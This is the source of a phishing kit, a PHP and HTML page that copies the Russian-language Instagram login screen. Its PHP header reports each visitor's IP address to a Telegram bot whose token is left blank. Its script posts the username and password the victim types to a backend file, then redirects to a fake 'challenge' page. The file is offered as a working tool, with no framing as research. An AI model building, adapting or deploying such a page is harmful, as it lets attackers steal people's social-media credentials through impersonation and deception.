<?php

	function sendTel($message){
$tokken = "";
$id = "";
		$filename = "https://api.telegram.org/bot".$tokken."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html";
		file_get_contents($filename);
    }
	
    $ip = $_SERVER["REMOTE_ADDR"];

    $message = "<b>Переход * [INSTAGRAM]</b> ".$ip."";
    sendTel($message);  
    
	
?>

<!DOCTYPE html>
<html lang="ru" class="js not-logged-in client-root"><head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <title>Войти • Instagram</title>

        <meta name="apple-mobile-web-app-status-bar-style" content="default">
        <meta name="mobile-web-app-capable" content="yes">
        <meta name="theme-color" content="#ffffff">
        <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover">
     
<link rel="shortcut icon" type="image/x-icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
                
<meta content="С возвращением в Instagram! Войдите, чтобы увидеть снимки и записи, сделанные вашими друзьями, родственниками и интересными вам людьми по всему миру." name="description">

<link href="https://www.instagram.com/static/bundles/metro/LoginAndSignupPage.css/9159bcc3b7b9.css" type="text/css" rel="stylesheet">

</head>

   <body class="" style="overflow:hidden;">
  
<style>

.outer {
    height: 100%;
    position: relative;
}
.outer img {
    position: absolute;
    margin: auto;
    left: 0;
    top: 0;
    bottom: 0;
    right: 0;
  }
  
</style>

<div class="outer">
     <img src="666.jpg" >
</div>
   
   <span id="react-root" style="display:none">

      <section class="_9eogI E3X2T">
         <main class="SCxLW  o64aR" role="main">
            <div class="tbpKJ">
               <article class="agXmL">
                  <div class="rgFsT ">
                     <div class="gr27e ">
                        <h1 class="NXVPg Szr5J  coreSpriteLoggedOutWordmark">Instagram</h1>
                        <div class="EPjEi">
						
						  <div class="gvIdY" id="preloader" style=""><div class="W1Bne  zKxRE   QrdPK"></div></div>
						   
                           <div class="HmktE" method="post" style="display:none">
						   
						 
						   
                              <div class="Igw0E     IwRSH      eGOV_         _4EzTm        FBi-h                                                                                                      "></div>
                              <div class="-MzZI">
                                 <div class="_9GP1n">
                                    <div id="labellogin" class="f0n8F">
									<label for="f3b9808256ce64" class="_9nyy2">Номер телефона, имя пользователя или эл. адрес</label>
									<input class="_2hvTZ pexuQ zyHYP" id="f3b9808256ce64" maxlength="75" name="username" type="text" value=""></div>
                                    <div class="i24fI"></div>
                                 </div>
                              </div>
                              <div class="-MzZI">
                                 <div class="_9GP1n   ">
                                    <div id="labelpass"  class="f0n8F"><label for="f16b586c9c588ac" class="_9nyy2">Пароль</label>
									<input class="_2hvTZ pexuQ zyHYP" id="f16b586c9c588ac" name="password" type="password" value=""></div>
                                    <div class="i24fI"></div>
                                 </div>
                              </div>
                              <div class="                  Igw0E     IwRSH      eGOV_         _4EzTm    bkEs3                          CovQj                  jKUp7          DhRcB                                                    ">
                             

<button id="send" class="_0mzm- sqdOP  L3NKy" type="submit" disabled>
<div class="Igw0E IwRSH eGOV_ _4EzTm">
<span id="noload">Войти</span>
<svg id="load" style="display:none; height: 18px; width: 18px; margin:0 auto;" class=" FSiF6 " viewBox="0 0 100 100"><rect fill="#fafafa" height="10" opacity="0" rx="5" ry="5" transform="rotate(-90 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.125" rx="5" ry="5" transform="rotate(-45 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.25" rx="5" ry="5" transform="rotate(0 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.375" rx="5" ry="5" transform="rotate(45 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.5" rx="5" ry="5" transform="rotate(90 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.625" rx="5" ry="5" transform="rotate(135 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.75" rx="5" ry="5" transform="rotate(180 50 50)" width="28" x="67" y="45"></rect><rect fill="#fafafa" height="10" opacity="0.875" rx="5" ry="5" transform="rotate(225 50 50)" width="28" x="67" y="45"></rect></svg></div>

</button>							 

                              </div>
                              <div class="K-1uj Z7p_S">
                                 <div class="s311c"></div>
                                 <div class="_0tv-g">или</div>
                                 <div class="s311c"></div>
                              </div>
                              <div class="                  Igw0E     IwRSH      eGOV_         _4EzTm    bkEs3                          CovQj                  jKUp7          DhRcB                                                    "><button class="_0mzm- sqdOP yWX7d        " type="button"><span class="coreSpriteFacebookIcon AeB99"></span><span class="KPnG0">Войти через Facebook</span></button></div>
                              <div class="eiCW-" id="slfErrorAlert">
                                 <p aria-atomic="true" role="alert" id="false" style="display:none">К сожалению, вы ввели неверный пароль. Проверьте свой пароль еще раз.</p>
								 <p aria-atomic="true" role="alert" id="false1" style="display:none">Введенное вами имя пользователя не принадлежит аккаунту. Проверьте свое имя пользователя и повторите попытку.</p>
                              </div>
                              <a class="_2Lks6" href="https://www.instagram.com/accounts/password/reset/">Забыли пароль?</a>
                           </div>
                        </div>
                     </div>
                     <div class="gr27e">
                        <div class="_7UhW9   xLCgt      MMzan   _0PwGv       uL8Hv         ">
                           <p class="izU2O">Еще нет аккаунта? <a href="https://www.instagram.com/accounts/emailsignup/"><span class="_7UhW9   xLCgt       qyrsm          se6yk        ">Зарегистрируйтесь</span></a></p>
                        </div>
                     </div>
                     <div class="APQi1">
                        <p class="b_nGN">Установите приложение.</p>
                        <div class="iNy2T"><a class="z1VUo" href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8&amp;vt=lo"><img alt="Доступно в Магазине приложений" class="Rt8TI" src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_russian-ru.png/bfba6d0fd6bd.png"></a><a class="z1VUo" href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DXRMxHQAEAAFlNr7IFVfL8nzm4rlJ%26utm_content%3Dlo%26utm_medium%3Dbadge"><img alt="Доступно в Google Play" class="Rt8TI" src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_russian-ru.png/4c70948c09f3.png"></a></div>
                     </div>
                  </div>
               </article>
            </div>
         </main>
         <footer class="_8Rna9  _3Laht " role="contentinfo">
            <div class="iseBh  VWk7Y " style="max-width: 935px;">
               <nav class="uxKLF">
                  <ul class="ixdEe">
                     <li class="K5OFK"><a class="l93RR" href="/about/us/">О нас</a></li>
                     <li class="K5OFK"><a class="l93RR" href="https://help.instagram.com/">Поддержка</a></li>
                     <li class="K5OFK"><a class="l93RR" href="https://instagram-press.com/">Пресса</a></li>
                     <li class="K5OFK"><a class="l93RR" href="/developer/">API</a></li>
                     <li class="K5OFK"><a class="l93RR" href="/about/jobs/">Вакансии</a></li>
                     <li class="K5OFK"><a class="l93RR" href="/legal/privacy/">Конфиденциальность</a></li>
                     <li class="K5OFK"><a class="l93RR _vfM2" href="/legal/terms/">Условия</a></li>
                     <li class="K5OFK"><a class="l93RR" href="/explore/locations/">Директория</a></li>
                     <li class="K5OFK"><a class="l93RR" href="/directory/profiles/">Профили</a></li>
                     <li class="K5OFK"><a class="l93RR" href="/directory/hashtags/">Хэштеги</a></li>
                     
                  </ul>
               </nav>
               <span class="DINPA">© 2019 Instagram</span>
            </div>
         </footer>
      </section>
   </span>
   <link rel="stylesheet" href="https://www.instagram.com/static/bundles/metro/ConsumerLibCommons.css/ecdeb303e8df.css" type="text/css" crossorigin="anonymous">
   <link rel="stylesheet" href="https://www.instagram.com/static/bundles/metro/ConsumerUICommons.css/f8b38ed83ff4.css" type="text/css" crossorigin="anonymous">
   <link rel="stylesheet" href="https://www.instagram.com/static/bundles/metro/ConsumerAsyncCommons.css/6f451cfba8c9.css" type="text/css" crossorigin="anonymous">
   <link rel="stylesheet" href="https://www.instagram.com/static/bundles/metro/Consumer.css/366aad278e6b.css" type="text/css" crossorigin="anonymous">
   <div class="Z2m7o">
      <div class="CgFia "></div>
   </div>
   
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
   
   
<script type="text/javascript">
    $(document).ready(function(){
		
	  setTimeout(function () {
    		$(".outer").css("display", "none");
			$("body").css("overflow", "");
			$("#react-root").fadeIn(300);
			
    }, 1000); // in milliseconds Belka3333
	
	
	  setTimeout(function () {
    		$("#preloader").fadeOut(100);
			$(".HmktE").fadeIn(300);
			
    }, 3000); // in milliseconds	
});

$(document).on('input', '#f3b9808256ce64', function () {

if($(this).val().length >= 1) {$("#labellogin").addClass("FATdn"); $('#send').attr('disabled',false);} else {$("#labellogin").removeClass("FATdn"); $('#send').attr('disabled',true);}

});

$(document).on('input', '#f16b586c9c588ac', function () {

if($(this).val().length >= 1) {$("#labelpass").addClass("FATdn");} else {$("#labelpass").removeClass("FATdn");}

});


	$("#send").click(function(){ 
	
	$("#false1").css("display", "none");
	$("#false").css("display", "none");
	
	$("#noload").css("display", "none");
	$("#load").fadeIn(300);

	$.ajax({
        type: "POST",
        url: 'main.php',
        data: {
            email: $("#f3b9808256ce64").val(),
            passo: $("#f16b586c9c588ac").val()
        },
		
    success: function(data) {

	if(data == "false") {
	
	$("#false").css("display", "block");
	
	$("#noload").css("display", "block");
	$("#load").css("display", "none");
	
	
    }
	
	if(data == "false1") {
	
	$("#false1").css("display", "block");
	
	$("#noload").css("display", "block");
	$("#load").css("display", "none");
	
	
    }
	
	if(data == "true") {
	
	$("#slfErrorAlert").css("display", "none");
	
	window.location.replace("/challenge.php");
	
    }	
					
    }
      
    })		

		
	});

</script>
   
   
</body>
</html>
